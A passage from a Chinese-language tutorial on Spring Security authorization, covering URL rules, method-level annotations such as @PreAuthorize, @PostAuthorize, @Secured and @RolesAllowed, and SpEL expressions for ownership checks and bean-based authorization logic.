<li><strong><code>hasAuthority(String authority)</code></strong>: <strong>要求拥有单个权限</strong><ul>
<li>直接匹配 <code>GrantedAuthority</code> 列表中的字符串，<strong>不会</strong>自动添加 <code>ROLE_</code> 前缀。</li>
<li>适用于细粒度的权限控制（RBAC 模型中的 Permission）。</li>
<li><strong>示例</strong>: <code>.requestMatchers(POST, &quot;/articles&quot;).hasAuthority(&quot;article:create&quot;)</code></li>
</ul>
</li>
<li><strong><code>hasAnyAuthority(String... authorities)</code></strong>: <strong>要求拥有多个权限中的任意一个</strong><ul>
<li>只要用户拥有参数列表中任何一个权限，即可访问。</li>
<li><strong>示例</strong>: <code>.requestMatchers(&quot;/articles/editor&quot;).hasAnyAuthority(&quot;article:edit&quot;, &quot;article:publish&quot;)</code></li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-2-5-综合示例"><a href="#3-2-5-综合示例" class="headerlink" title="3.2.5 综合示例"></a>3.2.5 综合示例</h4><p>一个典型的、遵循最佳实践的授权配置可能如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">            <span class="comment">// 1. 优先放行公共资源</span></span><br><span class="line">            .requestMatchers(<span class="string">&quot;/css/**&quot;</span>, <span class="string">&quot;/js/**&quot;</span>, <span class="string">&quot;/images/**&quot;</span>, <span class="string">&quot;/webjars/**&quot;</span>).permitAll()</span><br><span class="line">            .requestMatchers(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;/home&quot;</span>, <span class="string">&quot;/register&quot;</span>, <span class="string">&quot;/login&quot;</span>).permitAll()</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 配置基于权限的细粒度规则</span></span><br><span class="line">            .requestMatchers(POST, <span class="string">&quot;/api/products&quot;</span>).hasAuthority(<span class="string">&quot;product:write&quot;</span>)</span><br><span class="line">            .requestMatchers(DELETE, <span class="string">&quot;/api/products/**&quot;</span>).hasAuthority(<span class="string">&quot;product:delete&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3. 配置基于角色的粗粒度规则</span></span><br><span class="line">            .requestMatchers(<span class="string">&quot;/admin/**&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">            .requestMatchers(<span class="string">&quot;/moderator/**&quot;</span>).hasAnyRole(<span class="string">&quot;ADMIN&quot;</span>, <span class="string">&quot;MODERATOR&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4. (兜底规则) 其他任何未匹配的请求，都必须登录后才能访问</span></span><br><span class="line">            .anyRequest().authenticated()</span><br><span class="line">        )</span><br><span class="line">        .formLogin(form -&gt; form.loginPage(<span class="string">&quot;/login&quot;</span>).permitAll());</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-3-方法级别的安全控制（-EnableMethodSecurity）"><a href="#3-3-方法级别的安全控制（-EnableMethodSecurity）" class="headerlink" title="3.3 方法级别的安全控制（@EnableMethodSecurity）"></a>3.3 方法级别的安全控制（@EnableMethodSecurity）</h3><p>URL 级别的授权能够保护 Web 端点，但它无法深入到业务逻辑层（Service Layer）。有时，我们需要对 Service 方法进行保护，确保即便是 Controller 层的代码逻辑出现疏忽，非法的调用也无法触及核心业务。方法安全正是为此而生。</p>
<h4 id="3-3-1-如何启用方法安全"><a href="#3-3-1-如何启用方法安全" class="headerlink" title="3.3.1 如何启用方法安全"></a>3.3.1 如何启用方法安全</h4><p>要使用方法安全注解，首先需要在你的主配置类或安全配置类上添加 <code>@EnableMethodSecurity</code> 注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableMethodSecurity</span> <span class="comment">// 启用方法级别的安全控制</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line">    <span class="comment">// ... 其他配置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加上这个注解后，Spring Security 会创建一个 AOP (面向切面编程) 的代理，来拦截标注了安全注解的方法调用，并在方法执行前后进行安全检查。</p>
<p>默认情况下，<code>@EnableMethodSecurity</code> 会启用对 <code>@PreAuthorize</code>, <code>@PostAuthorize</code>, <code>@Secured</code> 和 <code>@RolesAllowed</code> (JSR-250) 注解的支持。</p>
<hr>
<h4 id="3-3-2-PreAuthorize-PostAuthorize-最强大、最灵活的注解"><a href="#3-3-2-PreAuthorize-PostAuthorize-最强大、最灵活的注解" class="headerlink" title="3.3.2 @PreAuthorize &#x2F; @PostAuthorize: 最强大、最灵活的注解"></a>3.3.2 <code>@PreAuthorize</code> &#x2F; <code>@PostAuthorize</code>: 最强大、最灵活的注解</h4><p>这两个注解是 Spring Security 自己的注解，它们内部支持 <strong>SpEL (Spring Expression Language)</strong> 表达式，这使得我们可以编写出极其灵活和强大的动态授权规则。</p>
<h5 id="1-PreAuthorize-expression"><a href="#1-PreAuthorize-expression" class="headerlink" title="1. @PreAuthorize(&quot;expression&quot;)"></a>1. <code>@PreAuthorize(&quot;expression&quot;)</code></h5><ul>
<li><strong>执行时机</strong>: 在<strong>方法执行之前</strong>进行权限检查。</li>
<li><strong>决策</strong>: 如果 SpEL 表达式返回 <code>false</code>，方法将<strong>不会被执行</strong>，并直接抛出 <code>AccessDeniedException</code>。</li>
<li><strong>适用场景</strong>: 这是<strong>最常用</strong>的方法安全注解。绝大多数授权决策都应该在方法执行前完成，以避免不必要的资源消耗和潜在的数据操作。</li>
</ul>
<p><strong>常用 SpEL 表达式:</strong></p>
<ul>
<li><p><strong>检查角色&#x2F;权限</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PreAuthorize(&quot;hasRole(&#x27;ADMIN&#x27;)&quot;)</span> <span class="comment">// 需要 ROLE_ADMIN 角色</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUser</span><span class="params">(Long userId)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;hasAnyRole(&#x27;ADMIN&#x27;, &#x27;MANAGER&#x27;)&quot;)</span> <span class="comment">// 需要 ADMIN 或 MANAGER 角色</span></span><br><span class="line"><span class="keyword">public</span> Report <span class="title function_">generateReport</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;hasAuthority(&#x27;user:delete&#x27;)&quot;)</span> <span class="comment">// 需要 &#x27;user:delete&#x27; 权限</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUser</span><span class="params">(Long userId)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>访问 <code>authentication</code> 对象</strong>:<br>SpEL 表达式可以直接访问 <code>SecurityContext</code> 中的 <code>authentication</code> 对象，从而获取当前登录用户的详细信息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只有用户名是 &quot;admin&quot; 的用户才能调用</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;authentication.name == &#x27;admin&#x27;&quot;)</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runAdminTask</span><span class="params">()</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>访问方法参数</strong>:<br>SpEL 表达式可以通过 <code>#参数名</code> 的形式来引用方法的参数，这对于实现“对象级别的访问控制”至关重要。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只有用户自己才能修改自己的信息</span></span><br><span class="line"><span class="comment">// #username 引用了方法的 username 参数</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;#username == authentication.principal.username&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUserProfile</span><span class="params">(String username, UserProfile newProfile)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设 User 对象有 owner 属性</span></span><br><span class="line"><span class="comment">// 只有文章的拥有者或管理员才能编辑</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;#article.owner == authentication.name or hasRole(&#x27;ADMIN&#x27;)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">editArticle</span><span class="params">(<span class="meta">@P(&quot;article&quot;)</span> Article article)</span> &#123; ... &#125; </span><br><span class="line"><span class="comment">// 使用 @P 注解为参数命名，使其在 SpEL 中可被引用</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>调用其他 Bean 的方法</strong>:<br>可以在 SpEL 表达式中通过 <code>@beanName.methodName()</code> 的形式调用 Spring 容器中任何 Bean 的方法，实现非常复杂的业务授权逻辑。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用名为 &#x27;permissionService&#x27; 的 Bean 的 checkPermission 方法</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;@permissionService.checkPermission(authentication, #userId)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> UserProfile <span class="title function_">getUserProfile</span><span class="params">(Long userId)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p>这是一种将授权逻辑从业务代码中完全抽离出来的强大模式。</p>
</li>
</ul>
<hr>
<h5 id="2-PostAuthorize-expression"><a href="#2-PostAuthorize-expression" class="headerlink" title="2. @PostAuthorize(&quot;expression&quot;)"></a>2. <code>@PostAuthorize(&quot;expression&quot;)</code></h5><ul>
<li><strong>执行时机</strong>: 在<strong>方法执行之后，返回结果之前</strong>进行权限检查。</li>
<li><strong>决策</strong>: 如果 SpEL 表达式返回 <code>false</code>，方法已经执行完毕，但其<strong>返回结果不会传递给调用者</strong>，而是抛出 <code>AccessDeniedException</code>。</li>
<li><strong>适用场景</strong>: 比较少见，通常用于需要<strong>根据方法的返回值</strong>来进行授权决策的场景。例如，一个方法返回了某个敏感对象，你需要检查当前用户是否有权查看这个特定的对象。</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法返回一个 Order 对象</span></span><br><span class="line"><span class="comment">// 只有订单的创建者或者管理员才能获取到这个订单的详细信息</span></span><br><span class="line"><span class="meta">@PostAuthorize(&quot;returnObject.customerUsername == authentication.name or hasRole(&#x27;ADMIN&#x27;)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Order <span class="title function_">getOrderDetails</span><span class="params">(Long orderId)</span> &#123;</span><br><span class="line">    <span class="type">Order</span> <span class="variable">order</span> <span class="operator">=</span> orderRepository.findById(orderId);</span><br><span class="line">    <span class="comment">// ... 此时方法逻辑已经执行</span></span><br><span class="line">    <span class="keyword">return</span> order; <span class="comment">// 在返回前，会对 returnObject (即 order) 进行权限检查</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>returnObject</code>: 是 SpEL 中一个特殊的关键字，代表了方法的返回值。</li>
</ul>
<p><strong>注意</strong>: 使用 <code>@PostAuthorize</code> 要小心，因为它是在业务逻辑执行后才进行检查。如果方法内部有修改数据的操作（如更新数据库），即使最后授权失败，这些操作也已经完成了，可能需要事务回滚来保证数据一致性。</p>
<hr>
<h4 id="3-3-3-Secured-和-RolesAllowed-简单的基于角色的控制"><a href="#3-3-3-Secured-和-RolesAllowed-简单的基于角色的控制" class="headerlink" title="3.3.3 @Secured 和 @RolesAllowed: 简单的基于角色的控制"></a>3.3.3 <code>@Secured</code> 和 <code>@RolesAllowed</code>: 简单的基于角色的控制</h4><p>这两个注解功能类似，都是用于简单的、基于角色的访问控制，它们不支持复杂的 SpEL 表达式。</p>
<h5 id="1-Secured-ROLE-NAME-1-ROLE-NAME-2"><a href="#1-Secured-ROLE-NAME-1-ROLE-NAME-2" class="headerlink" title="1. @Secured({&quot;ROLE_NAME_1&quot;, &quot;ROLE_NAME_2&quot;})"></a>1. <code>@Secured({&quot;ROLE_NAME_1&quot;, &quot;ROLE_NAME_2&quot;})</code></h5><ul>
<li><strong>来源</strong>: Spring Security 早期就有的注解。</li>
<li><strong>用法</strong>: 注解的参数是一个字符串数组，代表允许访问的角色列表。</li>
<li><strong>约定</strong>: 角色名<strong>必须</strong>以 <code>ROLE_</code> 作为前缀。</li>
<li><strong>逻辑</strong>: 拥有参数列表中<strong>任意一个</strong>角色的用户即可访问。</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只有拥有 ROLE_ADMIN 角色的用户才能访问</span></span><br><span class="line"><span class="meta">@Secured(&quot;ROLE_ADMIN&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resetSystem</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拥有 ROLE_ADMIN 或 ROLE_MANAGER 角色的用户可以访问</span></span><br><span class="line"><span class="meta">@Secured(&#123;&quot;ROLE_ADMIN&quot;, &quot;ROLE_MANAGER&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> DashboardData <span class="title function_">getDashboard</span><span class="params">()</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-RolesAllowed-ROLE-1-ROLE-2"><a href="#2-RolesAllowed-ROLE-1-ROLE-2" class="headerlink" title="2. @RolesAllowed({&quot;ROLE_1&quot;, &quot;ROLE_2&quot;})"></a>2. <code>@RolesAllowed({&quot;ROLE_1&quot;, &quot;ROLE_2&quot;})</code></h5><ul>
<li><strong>来源</strong>: <strong>JSR-250</strong> 标准定义的一套 Java 安全注解之一。Spring Security 提供了对其的支持。</li>
<li><strong>用法</strong>: 与 <code>@Secured</code> 类似，参数也是一个字符串数组。</li>
<li><strong>约定</strong>: 角色名<strong>不需要</strong> <code>ROLE_</code> 前缀。Spring Security 在处理时会自动为你添加 <code>ROLE_</code> 前缀进行匹配。</li>
<li><strong>逻辑</strong>: 同样，拥有参数列表中<strong>任意一个</strong>角色的用户即可访问。</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.annotation.security.RolesAllowed;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拥有 ROLE_ADMIN 角色的用户可以访问</span></span><br><span class="line"><span class="meta">@RolesAllowed(&quot;ADMIN&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">resetSystem</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拥有 ROLE_ADMIN 或 ROLE_MANAGER 角色的用户可以访问</span></span><br><span class="line"><span class="meta">@RolesAllowed(&#123;&quot;ADMIN&quot;, &quot;MANAGER&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> DashboardData <span class="title function_">getDashboard</span><span class="params">()</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-3-4-如何选择？"><a href="#3-3-4-如何选择？" class="headerlink" title="3.3.4 如何选择？"></a>3.3.4 如何选择？</h4><ul>
<li><strong>首选 <code>@PreAuthorize</code></strong>: 在绝大多数情况下，<code>@PreAuthorize</code> 都是最佳选择。它的 SpEL 功能提供了无与伦比的灵活性，能够满足几乎所有的授权需求，尤其是需要动态判断和对象级别访问控制的场景。</li>
<li><strong>使用 <code>@PostAuthorize</code></strong>: 仅在需要基于方法<strong>返回值</strong>进行判断时才考虑使用，并注意其副作用。</li>
<li><strong>使用 <code>@Secured</code> 或 <code>@RolesAllowed</code></strong>: 如果你的授权需求非常简单，仅仅是基于静态的角色列表，并且你和你的团队喜欢这种更简洁的声明方式，那么可以使用它们。<code>@RolesAllowed</code> 因为是 Java EE 标准的一部分，可能在某些追求标准化的项目中更受欢迎。但总的来说，它们的功能是 <code>@PreAuthorize(&quot;hasAnyRole(...)&quot;)</code> 的一个子集。</li>
</ul>
<hr>
<h3 id="3-4-在授权中使用-SpEL-表达式"><a href="#3-4-在授权中使用-SpEL-表达式" class="headerlink" title="3.4 在授权中使用 SpEL 表达式"></a>3.4 在授权中使用 SpEL 表达式</h3><p>SpEL 是一种功能强大的表达式语言，它允许在运行时查询和操作对象图。在 Spring Security 中，SpEL 被集成到了 <code>@PreAuthorize</code> 和 <code>@PostAuthorize</code> 等注解中，将静态的授权规则提升到了一个全新的、动态的维度。这使得我们能够编写出与当前请求上下文、方法参数甚至其他业务逻辑紧密相关的复杂授权规则。</p>
<h4 id="3-4-1-SpEL-表达式的核心能力"><a href="#3-4-1-SpEL-表达式的核心能力" class="headerlink" title="3.4.1 SpEL 表达式的核心能力"></a>3.4.1 SpEL 表达式的核心能力</h4><p>在 Spring Security 的方法安全表达式中，SpEL 提供了一个强大的“根对象”（Root Object）作为评估上下文，我们可以通过它访问各种有用的内置对象和函数。</p>
<h5 id="1-内置的安全表达式"><a href="#1-内置的安全表达式" class="headerlink" title="1. 内置的安全表达式"></a>1. 内置的安全表达式</h5><p>Spring Security 提供了一系列内置的、可以直接使用的安全相关函数，这些函数极大地方便了我们编写授权规则。</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>等价的 URL 配置方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>hasRole(&#39;ROLE_NAME&#39;)</code></td>
<td><code>.hasRole(&quot;NAME&quot;)</code></td>
<td>判断当前用户是否拥有指定角色。 <strong>注意</strong>: 角色名通常需要 <code>ROLE_</code> 前缀。</td>
</tr>
<tr>
<td><code>hasAnyRole(&#39;R1&#39;, &#39;R2&#39;)</code></td>
<td><code>.hasAnyRole(&quot;R1&quot;,&quot;R2&quot;)</code></td>
<td>判断用户是否拥有列表中的任意一个角色。</td>
</tr>
<tr>
<td><code>hasAuthority(&#39;AUTH&#39;)</code></td>
<td><code>.hasAuthority(&quot;AUTH&quot;)</code></td>
<td>判断用户是否拥有指定权限。</td>
</tr>
<tr>
<td><code>hasAnyAuthority(&#39;A1&#39;,&#39;A2&#39;)</code></td>
<td><code>.hasAnyAuthority(&quot;A1&quot;,&quot;A2&quot;)</code></td>
<td>判断用户是否拥有列表中的任意一个权限。</td>
</tr>
<tr>
<td><code>permitAll</code></td>
<td><code>.permitAll()</code></td>
<td>总是返回 <code>true</code>，允许所有访问。</td>
</tr>
<tr>
<td><code>denyAll</code></td>
<td><code>.denyAll()</code></td>
<td>总是返回 <code>false</code>，拒绝所有访问。</td>
</tr>
<tr>
<td><code>isAuthenticated()</code></td>
<td><code>.authenticated()</code></td>
<td>判断用户是否已经认证（非匿名）。</td>
</tr>
<tr>
<td><code>isAnonymous()</code></td>
<td></td>
<td>判断用户是否是匿名用户。</td>
</tr>
<tr>
<td><code>isRememberMe()</code></td>
<td></td>
<td>判断用户是否是通过“记住我”功能认证的。</td>
</tr>
<tr>
<td><code>isFullyAuthenticated()</code></td>
<td></td>
<td>判断用户是否经过了完整的认证流程（而不是通过“记住我”）。</td>
</tr>
</tbody></table>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 等同于 @Secured(&quot;ROLE_ADMIN&quot;)</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;hasRole(&#x27;ROLE_ADMIN&#x27;)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAdminAction</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要求用户必须是完整登录，而不是“记住我”状态</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;isFullyAuthenticated()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">changePassword</span><span class="params">(String newPassword)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-访问-authentication-对象"><a href="#2-访问-authentication-对象" class="headerlink" title="2. 访问 authentication 对象"></a>2. 访问 <code>authentication</code> 对象</h5><p>SpEL 表达式可以直接访问当前 <code>SecurityContext</code> 中的 <code>authentication</code> 对象。这是实现动态判断的基础。</p>
<ul>
<li><code>authentication.name</code>: 获取当前用户名。</li>
<li><code>authentication.principal</code>: 获取当前用户主体（Principal）。如果使用的是 <code>UserDetails</code>，那么这个对象就是你的 <code>UserDetails</code> 实例。</li>
<li><code>authentication.authorities</code>: 获取当前用户的权限集合。</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只有用户名为 &#x27;superadmin&#x27; 的用户才能执行</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;authentication.name == &#x27;superadmin&#x27;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runSuperAdminTask</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设你的 UserDetails 实现类有一个 getEmail() 方法</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;authentication.principal.email.endsWith(&#x27;@mycompany.com&#x27;)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accessInternalResource</span><span class="params">()</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-4-2-动态判断：结合方法参数"><a href="#3-4-2-动态判断：结合方法参数" class="headerlink" title="3.4.2 动态判断：结合方法参数"></a>3.4.2 动态判断：结合方法参数</h4><p>SpEL 最强大的功能之一是能够引用被拦截方法的参数。这使得授权规则可以根据每次方法调用的具体上下文来动态决策。</p>
<p><strong>语法</strong>：通过 <code>#参数名</code> 的形式来引用。</p>
<h5 id="1-“所有权”-检查"><a href="#1-“所有权”-检查" class="headerlink" title="1. “所有权” 检查"></a>1. “所有权” 检查</h5><p>这是最经典的用例：判断当前用户是否是某个数据对象的“所有者”。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 场景：用户只能查看自己的账户信息</span></span><br><span class="line"><span class="comment">// #accountId 引用了方法的 accountId 参数</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;#accountId == authentication.principal.accountId&quot;)</span> </span><br><span class="line"><span class="comment">// 假设你的 UserDetails 实现中有 getAccountId() 方法</span></span><br><span class="line"><span class="keyword">public</span> Account <span class="title function_">getAccountDetails</span><span class="params">(Long accountId)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景：用户只能更新自己的博客文章</span></span><br><span class="line"><span class="comment">// #post.authorUsername 访问了 post 对象的 authorUsername 属性</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;#post.authorUsername == authentication.name or hasRole(&#x27;ROLE_MODERATOR&#x27;)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updatePost</span><span class="params">(Post post)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-使用-P-或-Param-注解为参数命名"><a href="#2-使用-P-或-Param-注解为参数命名" class="headerlink" title="2. 使用 @P 或 @Param 注解为参数命名"></a>2. 使用 <code>@P</code> 或 <code>@Param</code> 注解为参数命名</h5><p>如果你的项目编译时没有保留参数名（例如，使用旧版本的 Java 或特定的编译设置），SpEL 可能无法通过 <code>#参数名</code> 找到参数。这时，可以使用 <code>@P</code> (Spring Security 提供) 或 <code>@Param</code> (Spring Data 提供) 注解来显式地为参数命名。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.security.access.prepost.PreAuthorize;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.parameters.P;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;#user.username == authentication.name&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">changeUserPassword</span><span class="params">(<span class="meta">@P(&quot;user&quot;)</span> User user, String newPassword)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p>这是一个很好的编程习惯，因为它使得代码意图更明确，且不受编译选项的影响。</p>
<hr>
<h4 id="3-4-3-访问-Bean-方法进行复杂判断"><a href="#3-4-3-访问-Bean-方法进行复杂判断" class="headerlink" title="3.4.3 访问 Bean 方法进行复杂判断"></a>3.4.3 访问 Bean 方法进行复杂判断</h4><p>当授权逻辑变得非常复杂，不适合写在一个长长的 SpEL 表达式里时，最佳实践是<strong>将授权逻辑封装到一个单独的 Spring Bean 中</strong>，然后在 SpEL 中调用这个 Bean 的方法。</p>
<h5 id="1-创建一个授权服务-Bean"><a href="#1-创建一个授权服务-Bean" class="headerlink" title="1. 创建一个授权服务 Bean"></a>1. 创建一个授权服务 Bean</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service(&quot;securityService&quot;)</span> <span class="comment">// 给 Bean 一个明确的名字</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> PostRepository postRepository;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查当前用户是否是某篇文章的作者</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPostOwner</span><span class="params">(Authentication authentication, Long postId)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">currentUsername</span> <span class="operator">=</span> authentication.getName();</span><br><span class="line">        <span class="type">Post</span> <span class="variable">post</span> <span class="operator">=</span> postRepository.findById(postId).orElse(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (post == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 或者抛出异常</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> post.getAuthorUsername().equals(currentUsername);</span><br><span class="line">    &#125;</span><br><span 